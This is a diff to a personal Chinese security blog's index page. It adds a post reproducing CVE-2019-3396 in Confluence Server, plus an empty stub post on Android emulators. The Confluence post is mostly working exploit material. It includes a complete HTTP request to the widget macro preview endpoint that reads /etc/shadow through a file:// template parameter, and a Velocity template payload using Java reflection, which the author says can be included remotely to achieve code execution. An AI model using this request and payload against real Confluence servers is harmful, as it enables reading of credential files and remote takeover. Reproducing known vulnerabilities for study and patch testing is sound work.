@@ -292,6 +292,287 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/08/CVE-2019-3396：confluence任意文件读取与RCE漏洞复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/08/CVE-2019-3396：confluence任意文件读取与RCE漏洞复现/" itemprop="url">CVE-2019-3396：confluence任意文件读取与RCE漏洞复现</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-08T19:20:18+08:00">
+                2019-04-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="CVE-2019-3396的相关情报"><a href="#CVE-2019-3396的相关情报" class="headerlink" title="CVE-2019-3396的相关情报"></a>CVE-2019-3396的相关情报</h1><p>详细的漏洞解析参考<a href="https://chybeta.github.io/2019/04/06/Analysis-for-%E3%80%90CVE-2019-3396%E3%80%91-SSTI-and-RCE-in-Confluence-Server-via-Widget-Connector/" title="cve-2019-3396" target="_blank" rel="noopener">cve-2019-3396</a></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>构造请求<br>    POST /rest/tinymce/1/macro/preview HTTP/1.1<br>    Host: confluence.xxxxxx.com<br>    Pragma: no-cache<br>    Cache-Control: no-cache<br>    Accept: text/html, <em>/</em>; q=0.01<br>    X-Requested-With: XMLHttpRequest<br>    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36<br>    Referer: <a href="http://confluence.xxxxx.com/pages/editpage.action?pageId=32093515" target="_blank" rel="noopener">http://confluence.xxxxx.com/pages/editpage.action?pageId=32093515</a><br>    Accept-Encoding: gzip, deflate<br>    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7<br>    Cookie: xxxxxxx<br>    Content-Type: application/json;charset=utf-8<br>    X-Requested-With: XMLHttpRequest<br>    Connection: close<br>    Content-Length: 176</p>
+<pre><code>{&quot;contentId&quot;:&quot;655594&quot;,&quot;macro&quot;:{&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:{&quot;url&quot;:&quot;https://dailymotion.com/video/xcpa64&quot;,&quot;width&quot;:&quot;300&quot;,&quot;height&quot;:&quot;200&quot;,&quot;_template&quot;:&quot;file:///etc/shadow”}}}
+</code></pre><p>通过template参数中使用file协议可以读取服务器上的任意文件</p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>由于confluence使用的是velocity模版引擎，而这个任意文件读取本身是通过渲染模版文件来读取的，因此如果模板文件里调用java对象是会被渲染执行的，具体参考下面：</p>
+<pre><code>#set($e=&quot;e&quot;)
+$e.getClass().forName(&apos;java.lang.System&apos;).getMethod(&apos;getProperty&apos;, $e.getClass().forName(&apos;java.lang.String&apos;)).invoke(null, &apos;os.name&apos;).toString()
+</code></pre><p>随意上传或者远端存储一个该内容的vm文件，然后通过上述的文件包含漏洞去包含这个模板文件即可导致RCE</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/08/安卓模拟器相关/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/08/安卓模拟器相关/" itemprop="url">Untitled</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-08T17:43:21+08:00">
+                2019-04-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<p>title: 安卓模拟器相关<br>date: 2019-04-08 17:43:21<br>tags:</p>
+<ul>
+<li>Android</li>
+<li>黑灰产薅羊毛</li>
+</ul>
+<p>categories: </p>
+<ul>
+<li>移动安全攻防</li>
+</ul>
+<hr>
+<p>#安卓模拟器杂七杂八的记录</p>
+<h2 id="adb常规操作"><a href="#adb常规操作" class="headerlink" title="adb常规操作"></a>adb常规操作</h2><p>可以参考mumu模拟器官方的文档，蛮详细的<a href="http://mumu.163.com/help/func/20190129/30131_797867.html" title="adb常规操作" target="_blank" rel="noopener">adb常规操作</a></p>
+<h2 id="mumu模拟器"><a href="#mumu模拟器" class="headerlink" title="mumu模拟器"></a>mumu模拟器</h2><h2 id="夜神模拟器"><a href="#夜神模拟器" class="headerlink" title="夜神模拟器"></a>夜神模拟器</h2>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/MITMPROXY的摘要/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -915,7 +1196,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -926,7 +1207,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -937,7 +1218,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
